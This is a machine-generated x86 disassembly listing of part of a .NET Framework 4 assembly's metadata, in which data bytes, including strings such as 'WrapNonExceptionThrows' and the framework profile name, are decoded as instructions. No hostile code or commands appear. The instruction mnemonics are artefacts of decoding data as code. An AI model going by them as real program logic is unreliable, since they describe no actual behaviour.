  40ca01:	01 0e                	add    %ecx,(%esi)
  40ca03:	0e                   	push   %cs
  40ca04:	05 20 02 01 0e       	add    $0xe010220,%eax
  40ca09:	08 04 20             	or     %al,(%eax,%eiz,1)
  40ca0c:	01 02                	add    %eax,(%edx)
  40ca0e:	0e                   	push   %cs
  40ca0f:	03 20                	add    (%eax),%esp
  40ca11:	00 0e                	add    %cl,(%esi)
  40ca13:	04 20                	add    $0x20,%al
  40ca15:	01 01                	add    %eax,(%ecx)
  40ca17:	02 04 20             	add    (%eax,%eiz,1),%al
  40ca1a:	01 01                	add    %eax,(%ecx)
  40ca1c:	0c 04                	or     $0x4,%al
  40ca1e:	20 01                	and    %al,(%ecx)
  40ca20:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40ca26:	5c                   	pop    %esp
  40ca27:	04 20                	add    $0x20,%al
  40ca29:	00 11                	add    %dl,(%ecx)
  40ca2b:	64 04 20             	fs add $0x20,%al
  40ca2e:	00 12                	add    %dl,(%edx)
  40ca30:	59                   	pop    %ecx
  40ca31:	03 28                	add    (%eax),%ebp
  40ca33:	00 0e                	add    %cl,(%esi)
  40ca35:	03 28                	add    (%eax),%ebp
  40ca37:	00 0a                	add    %cl,(%edx)
  40ca39:	03 28                	add    (%eax),%ebp
  40ca3b:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40ca41:	5c                   	pop    %esp
  40ca42:	04 28                	add    $0x28,%al
  40ca44:	00 11                	add    %dl,(%ecx)
  40ca46:	64 04 00             	fs add $0x0,%al
  40ca49:	00 00                	add    %al,(%eax)
  40ca4b:	00 04 03             	add    %al,(%ebx,%eax,1)
  40ca4e:	00 00                	add    %al,(%eax)
  40ca50:	00 04 04             	add    %al,(%esp,%eax,1)
  40ca53:	00 00                	add    %al,(%eax)
  40ca55:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40ca5c:	06                   	push   %es
  40ca5d:	00 00                	add    %al,(%eax)
  40ca5f:	00 04 07             	add    %al,(%edi,%eax,1)
  40ca62:	00 00                	add    %al,(%eax)
  40ca64:	00 04 08             	add    %al,(%eax,%ecx,1)
  40ca67:	00 00                	add    %al,(%eax)
  40ca69:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40ca6c:	00 00                	add    %al,(%eax)
  40ca6e:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca71:	00 00                	add    %al,(%eax)
  40ca73:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca76:	00 00                	add    %al,(%eax)
  40ca78:	00 06                	add    %al,(%esi)
  40ca7a:	00 02                	add    %al,(%edx)
  40ca7c:	0e                   	push   %cs
  40ca7d:	12 61 08             	adc    0x8(%ecx),%ah
  40ca80:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca85:	61                   	popa
  40ca86:	06                   	push   %es
  40ca87:	00 02                	add    %al,(%edx)
  40ca89:	0e                   	push   %cs
  40ca8a:	05 12 61 05 00       	add    $0x56112,%eax
  40ca8f:	01 01                	add    %eax,(%ecx)
  40ca91:	12 61 06             	adc    0x6(%ecx),%ah
  40ca94:	00 02                	add    %al,(%edx)
  40ca96:	01 12                	add    %edx,(%edx)
  40ca98:	61                   	popa
  40ca99:	0e                   	push   %cs
  40ca9a:	07                   	pop    %es
  40ca9b:	00 02                	add    %al,(%edx)
  40ca9d:	01 12                	add    %edx,(%edx)
  40ca9f:	61                   	popa
  40caa0:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40caa5:	01 12                	add    %edx,(%edx)
  40caa7:	61                   	popa
  40caa8:	0d 06 00 02 01       	or     $0x1020006,%eax
  40caad:	12 61 0c             	adc    0xc(%ecx),%ah
  40cab0:	06                   	push   %es
  40cab1:	00 02                	add    %al,(%edx)
  40cab3:	01 12                	add    %edx,(%edx)
  40cab5:	61                   	popa
  40cab6:	02 06                	add    (%esi),%al
  40cab8:	00 02                	add    %al,(%edx)
  40caba:	01 12                	add    %edx,(%edx)
  40cabc:	61                   	popa
  40cabd:	0b 06                	or     (%esi),%eax
  40cabf:	00 02                	add    %al,(%edx)
  40cac1:	01 12                	add    %edx,(%edx)
  40cac3:	61                   	popa
  40cac4:	0a 03                	or     (%ebx),%al
  40cac6:	06                   	push   %es
  40cac7:	11 78 04             	adc    %edi,0x4(%eax)
  40caca:	20 01                	and    %al,(%ecx)
  40cacc:	01 08                	add    %ecx,(%eax)
  40cace:	08 01                	or     %al,(%ecx)
  40cad0:	00 08                	add    %cl,(%eax)
  40cad2:	00 00                	add    %al,(%eax)
  40cad4:	00 00                	add    %al,(%eax)
  40cad6:	00 1e                	add    %bl,(%esi)
  40cad8:	01 00                	add    %eax,(%eax)
  40cada:	01 00                	add    %eax,(%eax)
  40cadc:	54                   	push   %esp
  40cadd:	02 16                	add    (%esi),%dl
  40cadf:	57                   	push   %edi
  40cae0:	72 61                	jb     0x40cb43
  40cae2:	70 4e                	jo     0x40cb32
  40cae4:	6f                   	outsl  %ds:(%esi),(%dx)
  40cae5:	6e                   	outsb  %ds:(%esi),(%dx)
  40cae6:	45                   	inc    %ebp
  40cae7:	78 63                	js     0x40cb4c
  40cae9:	65 70 74             	gs jo  0x40cb60
  40caec:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40caf3:	77 73                	ja     0x40cb68
  40caf5:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cafb:	71 08                	jno    0x40cb05
  40cafd:	01 00                	add    %eax,(%eax)
  40caff:	02 00                	add    (%eax),%al
  40cb01:	00 00                	add    %al,(%eax)
  40cb03:	00 00                	add    %al,(%eax)
  40cb05:	05 01 00 00 00       	add    $0x1,%eax
  40cb0a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cb0d:	00 07                	add    %al,(%edi)
  40cb0f:	31 2e                	xor    %ebp,(%esi)
  40cb11:	30 2e                	xor    %ch,(%esi)
  40cb13:	30 2e                	xor    %ch,(%esi)
  40cb15:	30 00                	xor    %al,(%eax)
  40cb17:	00 65 01             	add    %ah,0x1(%ebp)
  40cb1a:	00 29                	add    %ch,(%ecx)
  40cb1c:	2e 4e                	cs dec %esi
  40cb1e:	45                   	inc    %ebp
  40cb1f:	54                   	push   %esp
  40cb20:	46                   	inc    %esi
  40cb21:	72 61                	jb     0x40cb84
  40cb23:	6d                   	insl   (%dx),%es:(%edi)
  40cb24:	65 77 6f             	gs ja  0x40cb96
  40cb27:	72 6b                	jb     0x40cb94
  40cb29:	2c 56                	sub    $0x56,%al
  40cb2b:	65 72 73             	gs jb  0x40cba1
  40cb2e:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40cb35:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40cb38:	72 6f                	jb     0x40cba9
  40cb3a:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cb41:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cb48:	0e                   	push   %cs
  40cb49:	14 46                	adc    $0x46,%al
  40cb4b:	72 61                	jb     0x40cbae
  40cb4d:	6d                   	insl   (%dx),%es:(%edi)
  40cb4e:	65 77 6f             	gs ja  0x40cbc0
  40cb51:	72 6b                	jb     0x40cbbe
  40cb53:	44                   	inc    %esp
  40cb54:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cb5b:	61                   	popa
  40cb5c:	6d                   	insl   (%dx),%es:(%edi)
  40cb5d:	65 1f                	gs pop %ds
  40cb5f:	2e 4e                	cs dec %esi
  40cb61:	45                   	inc    %ebp
  40cb62:	54                   	push   %esp
  40cb63:	20 46 72             	and    %al,0x72(%esi)
  40cb66:	61                   	popa
  40cb67:	6d                   	insl   (%dx),%es:(%edi)
  40cb68:	65 77 6f             	gs ja  0x40cbda
  40cb6b:	72 6b                	jb     0x40cbd8
  40cb6d:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb70:	43                   	inc    %ebx
  40cb71:	6c                   	insb   (%dx),%es:(%edi)
  40cb72:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb79:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb7a:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb81:	04 49                	add    $0x49,%al
  40cb83:	74 65                	je     0x40cbea
  40cb85:	6d                   	insl   (%dx),%es:(%edi)
  40cb86:	00 00                	add    %al,(%eax)
  40cb88:	03 07                	add    (%edi),%eax
  40cb8a:	01 08                	add    %ecx,(%eax)
  40cb8c:	04 00                	add    $0x0,%al
  40cb8e:	01 08                	add    %ecx,(%eax)
  40cb90:	0e                   	push   %cs
  40cb91:	03 07                	add    (%edi),%eax
  40cb93:	01 02                	add    %eax,(%edx)
  40cb95:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb9a:	b1 05                	mov    $0x5,%cl
  40cb9c:	20 01                	and    %al,(%ecx)
  40cb9e:	0e                   	push   %cs
  40cb9f:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cba4:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cbaa:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cbb0:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cbb5:	03 02                	add    (%edx),%eax
  40cbb7:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cbbc:	14 07                	adc    $0x7,%al
  40cbbe:	08 0e                	or     %cl,(%esi)
  40cbc0:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cbc6:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cbcc:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cbd2:	20 03                	and    %al,(%ebx)
  40cbd4:	01 11                	add    %edx,(%ecx)
  40cbd6:	80 d5 11             	adc    $0x11,%ch
  40cbd9:	80 d9 11             	sbb    $0x11,%cl
  40cbdc:	80 dd 05             	sbb    $0x5,%ch
  40cbdf:	00 02                	add    %al,(%edx)
  40cbe1:	02 0e                	add    (%esi),%cl
  40cbe3:	0e                   	push   %cs
  40cbe4:	06                   	push   %es
  40cbe5:	20 01                	and    %al,(%ecx)
  40cbe7:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cbec:	20 01                	and    %al,(%ecx)
  40cbee:	08 08                	or     %cl,(%eax)
  40cbf0:	07                   	pop    %es
  40cbf1:	00 01                	add    %al,(%ecx)
  40cbf3:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cbf8:	07                   	pop    %es
  40cbf9:	20 02                	and    %al,(%edx)
  40cbfb:	01 12                	add    %edx,(%edx)
  40cbfd:	80 c9 08             	or     $0x8,%cl
  40cc00:	06                   	push   %es
  40cc01:	20 01                	and    %al,(%ecx)
  40cc03:	01 12                	add    %edx,(%edx)
  40cc05:	80 f1 09             	xor    $0x9,%cl
  40cc08:	20 02                	and    %al,(%edx)
  40cc0a:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cc0f:	80 f5 05             	xor    $0x5,%ch
  40cc12:	20 02                	and    %al,(%edx)
  40cc14:	08 08                	or     %cl,(%eax)
  40cc16:	08 06                	or     %al,(%esi)
  40cc18:	20 02                	and    %al,(%edx)
  40cc1a:	01 12                	add    %edx,(%edx)
  40cc1c:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cc21:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cc24:	09 20                	or     %esp,(%eax)
  40cc26:	03 01                	add    (%ecx),%eax
  40cc28:	12 61 02             	adc    0x2(%ecx),%ah
  40cc2b:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cc31:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cc37:	01 0e                	add    %ecx,(%esi)
  40cc39:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cc3f:	02 09                	add    (%ecx),%cl
  40cc41:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cc44:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cc4a:	0c 20                	or     $0x20,%al
  40cc4c:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cc51:	08 08                	or     %cl,(%eax)
  40cc53:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cc59:	01 11                	add    %edx,(%ecx)
  40cc5b:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cc61:	02 12                	add    (%edx),%dl
  40cc63:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cc66:	02 08                	add    (%eax),%cl
  40cc68:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc6e:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc73:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc78:	03 08                	add    (%eax),%ecx
  40cc7a:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc7f:	20 01                	and    %al,(%ecx)
  40cc81:	01 12                	add    %edx,(%edx)
  40cc83:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc89:	1c 0c                	sbb    $0xc,%al
  40cc8b:	07                   	pop    %es
  40cc8c:	06                   	push   %es
  40cc8d:	1c 02                	sbb    $0x2,%al
  40cc8f:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc94:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc9a:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc9d:	02 07                	add    (%edi),%al
  40cc9f:	20 02                	and    %al,(%edx)
  40cca1:	02 08                	add    (%eax),%cl
  40cca3:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cca9:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40ccaf:	07                   	pop    %es
  40ccb0:	0a 12                	or     (%edx),%dl
  40ccb2:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40ccb9:	08 12 81 
  40ccbc:	41                   	inc    %ecx
  40ccbd:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40ccc3:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40ccc8:	4d                   	dec    %ebp
  40ccc9:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40ccce:	0e                   	push   %cs
  40cccf:	05 00 00 12 81       	add    $0x81120000,%eax
  40ccd4:	41                   	inc    %ecx
  40ccd5:	05 20 00 12 81       	add    $0x81120020,%eax
  40ccda:	55                   	push   %ebp
  40ccdb:	06                   	push   %es
  40ccdc:	00 00                	add    %al,(%eax)
  40ccde:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cce3:	00 01                	add    %al,(%ecx)
  40cce5:	0e                   	push   %cs
  40cce6:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cceb:	01 11                	add    %edx,(%ecx)
  40cced:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40ccf4:	41                   	inc    %ecx
  40ccf5:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40ccfb:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40cd02:	49                   	dec    %ecx
  40cd03:	0e                   	push   %cs
  40cd04:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40cd0a:	0e                   	push   %cs
  40cd0b:	0e                   	push   %cs
  40cd0c:	0e                   	push   %cs
  40cd0d:	0e                   	push   %cs
  40cd0e:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cd13:	1c 07                	sbb    $0x7,%al
  40cd15:	20 02                	and    %al,(%edx)
  40cd17:	01 0e                	add    %ecx,(%esi)
  40cd19:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40cd1f:	0a 02                	or     (%edx),%al
  40cd21:	10 07                	adc    %al,(%edi)
  40cd23:	06                   	push   %es
  40cd24:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40cd2a:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40cd30:	0e                   	push   %cs
  40cd31:	02 05 20 00 12 81    	add    0x81120020,%al
  40cd37:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40cd3d:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40cd43:	91                   	xchg   %eax,%ecx
  40cd44:	04 20                	add    $0x20,%al
  40cd46:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cd49:	04 07                	add    $0x7,%al
  40cd4b:	02 02                	add    (%edx),%al
  40cd4d:	02 03                	add    (%ebx),%al
  40cd4f:	20 00                	and    %al,(%eax)
  40cd51:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cd54:	02 18                	add    (%eax),%bl
  40cd56:	02 03                	add    (%ebx),%al
  40cd58:	07                   	pop    %es
  40cd59:	01 0e                	add    %ecx,(%esi)
  40cd5b:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd60:	9d                   	popf
  40cd61:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cd66:	1c 0a                	sbb    $0xa,%al
  40cd68:	07                   	pop    %es
  40cd69:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd6e:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd73:	20 01                	and    %al,(%ecx)
  40cd75:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd7b:	0e                   	push   %cs
  40cd7c:	08 08                	or     %cl,(%eax)
  40cd7e:	06                   	push   %es
  40cd7f:	07                   	pop    %es
  40cd80:	02 02                	add    (%edx),%al
  40cd82:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd88:	0e                   	push   %cs
  40cd89:	0e                   	push   %cs
  40cd8a:	0e                   	push   %cs
  40cd8b:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd90:	ad                   	lods   %ds:(%esi),%eax
  40cd91:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd96:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd9b:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cda1:	02 11                	add    (%ecx),%dl
  40cda3:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cda9:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cdb0:	12 81 8d 
  40cdb3:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cdb9:	12 41 01             	adc    0x1(%ecx),%al
  40cdbc:	0e                   	push   %cs
  40cdbd:	05 20 01 01 13       	add    $0x13010120,%eax
  40cdc2:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cdc8:	00 06                	add    %al,(%esi)
  40cdca:	00 02                	add    %al,(%edx)
  40cdcc:	0e                   	push   %cs
  40cdcd:	0e                   	push   %cs
  40cdce:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cdd3:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cdd8:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cdde:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cde4:	c5 09                	lds    (%ecx),%ecx
  40cde6:	00 02                	add    %al,(%edx)
  40cde8:	02 11                	add    (%ecx),%dl
  40cdea:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cdf0:	07                   	pop    %es
  40cdf1:	02 12                	add    (%edx),%dl
  40cdf3:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cdf8:	01 02                	add    %eax,(%edx)
  40cdfa:	0e                   	push   %cs
  40cdfb:	10 02                	adc    %al,(%edx)
  40cdfd:	06                   	push   %es
  40cdfe:	00 01                	add    %al,(%ecx)
  40ce00:	01 12                	add    %edx,(%edx)
  40ce02:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40ce08:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40ce0f:	0e                   	push   %cs
  40ce10:	1c 11                	sbb    $0x11,%al
  40ce12:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40ce18:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40ce1f:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40ce25:	05 07 20 02 12       	add    $0x12022007,%eax
  40ce2a:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40ce31:	12 60 0e             	adc    0xe(%eax),%ah
  40ce34:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce39:	12 60 12             	adc    0x12(%eax),%ah
  40ce3c:	60                   	pusha
  40ce3d:	06                   	push   %es
  40ce3e:	15 12 41 01 12       	adc    $0x12014112,%eax
  40ce43:	60                   	pusha
  40ce44:	10 10                	adc    %dl,(%eax)
  40ce46:	01 01                	add    %eax,(%ecx)
  40ce48:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40ce4d:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40ce53:	1e                   	push   %ds
  40ce54:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ce57:	01 12                	add    %edx,(%edx)
  40ce59:	60                   	pusha
  40ce5a:	09 20                	or     %esp,(%eax)
  40ce5c:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40ce62:	13 00                	adc    (%eax),%eax
  40ce64:	07                   	pop    %es
  40ce65:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce6a:	12 60 04             	adc    0x4(%eax),%ah
  40ce6d:	20 00                	and    %al,(%eax)
  40ce6f:	13 00                	adc    (%eax),%eax
  40ce71:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce76:	00 03                	add    %al,(%ebx)
  40ce78:	07                   	pop    %es
  40ce79:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce80:	e5 07                	in     $0x7,%eax
  40ce82:	20 01                	and    %al,(%ecx)
  40ce84:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce8a:	20 01                	and    %al,(%ecx)
  40ce8c:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce92:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce95:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce9b:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40cea1:	00 02                	add    %al,(%edx)
  40cea3:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40cea9:	0e                   	push   %cs
  40ceaa:	1c 00                	sbb    $0x0,%al
  40ceac:	05 12 82 05 11       	add    $0x11058212,%eax
  40ceb1:	82 09 0e             	orb    $0xe,(%ecx)
  40ceb4:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ceb9:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40cebf:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40cec4:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40ceca:	45                   	inc    %ebp
  40cecb:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40ced1:	4d                   	dec    %ebp
  40ced2:	1c 12                	sbb    $0x12,%al
  40ced4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ced9:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cede:	0e                   	push   %cs
  40cedf:	0b 00                	or     (%eax),%eax
  40cee1:	01 15 12 45 01 13    	add    %edx,0x13014512
  40cee7:	00 12                	add    %dl,(%edx)
  40cee9:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40cef0:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40cef5:	4d                   	dec    %ebp
  40cef6:	1c 12                	sbb    $0x12,%al
  40cef8:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cefd:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cf02:	0e                   	push   %cs
  40cf03:	17                   	pop    %ss
  40cf04:	20 0a                	and    %cl,(%edx)
  40cf06:	01 13                	add    %edx,(%ebx)
  40cf08:	00 13                	add    %dl,(%ebx)
  40cf0a:	01 13                	add    %edx,(%ebx)
  40cf0c:	02 13                	add    (%ebx),%dl
  40cf0e:	03 13                	add    (%ebx),%edx
  40cf10:	04 13                	add    $0x13,%al
  40cf12:	05 13 06 13 07       	add    $0x7130613,%eax
  40cf17:	13 08                	adc    (%eax),%ecx
  40cf19:	13 09                	adc    (%ecx),%ecx
  40cf1b:	05 07 01 12 82       	add    $0x82120107,%eax
  40cf20:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cf25:	0e                   	push   %cs
  40cf26:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cf2b:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cf31:	06                   	push   %es
  40cf32:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cf38:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cf3e:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cf43:	20 01                	and    %al,(%ecx)
  40cf45:	01 11                	add    %edx,(%ecx)
  40cf47:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cf4e:	82 31 05             	xorb   $0x5,(%ecx)
  40cf51:	20 00                	and    %al,(%eax)
  40cf53:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cf59:	01 12                	add    %edx,(%edx)
  40cf5b:	61                   	popa
  40cf5c:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cf62:	08 20                	or     %ah,(%eax)
  40cf64:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cf6a:	08 1a                	or     %bl,(%edx)
  40cf6c:	07                   	pop    %es
  40cf6d:	0a 12                	or     (%edx),%dl
  40cf6f:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf76:	21 1d 05 
  40cf79:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf7e:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf85:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf8a:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf90:	45                   	inc    %ebp
  40cf91:	08 08                	or     %cl,(%eax)
  40cf93:	04 07                	add    $0x7,%al
  40cf95:	02 02                	add    (%edx),%al
  40cf97:	08 09                	or     %cl,(%ecx)
  40cf99:	00 02                	add    %al,(%edx)
  40cf9b:	01 12                	add    %edx,(%edx)
  40cf9d:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cfa1:	4d                   	dec    %ebp
  40cfa2:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cfa7:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cfad:	05 08 05 07 07       	add    $0x7070508,%eax
  40cfb2:	02 12                	add    (%edx),%dl
  40cfb4:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cfb8:	08 07                	or     %al,(%edi)
  40cfba:	04 12                	add    $0x12,%al
  40cfbc:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cfc1:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cfc6:	1c 06                	sbb    $0x6,%al
  40cfc8:	07                   	pop    %es
  40cfc9:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40cfcf:	20 01                	and    %al,(%ecx)
  40cfd1:	13 00                	adc    (%eax),%eax
  40cfd3:	08 04 07             	or     %al,(%edi,%eax,1)
  40cfd6:	01 12                	add    %edx,(%edx)
  40cfd8:	60                   	pusha
  40cfd9:	0e                   	push   %cs
  40cfda:	07                   	pop    %es
  40cfdb:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cfe0:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cfe6:	12 60 07             	adc    0x7(%eax),%ah
  40cfe9:	07                   	pop    %es
  40cfea:	04 08                	add    $0x8,%al
  40cfec:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cff1:	20 01                	and    %al,(%ecx)
  40cff3:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cff9:	64 04 00             	fs add $0x0,%al
  40cffc:	01 0b                	add    %ecx,(%ebx)
  40cffe:	0a 04 00             	or     (%eax,%eax,1),%al
  40d001:	01 0b                	add    %ecx,(%ebx)
  40d003:	0e                   	push   %cs
  40d004:	04 00                	add    $0x0,%al
  40d006:	01 0b                	add    %ecx,(%ebx)
  40d008:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40d00d:	0c 06                	or     $0x6,%al
  40d00f:	00 01                	add    %al,(%ecx)
  40d011:	0b 11                	or     (%ecx),%edx
  40d013:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40d01a:	04 00 01 
  40d01d:	0a 0e                	or     (%esi),%cl
  40d01f:	04 00                	add    $0x0,%al
  40d021:	01 0a                	add    %ecx,(%edx)
  40d023:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40d028:	0c 06                	or     $0x6,%al
  40d02a:	00 01                	add    %al,(%ecx)
  40d02c:	0a 11                	or     (%ecx),%dl
  40d02e:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40d035:	04 00 01 
  40d038:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40d03d:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40d041:	ad                   	lods   %ds:(%esi),%eax
  40d042:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40d047:	0c 07                	or     $0x7,%al
  40d049:	07                   	pop    %es
  40d04a:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40d050:	0d 20 04 01 0e       	or     $0xe010420,%eax
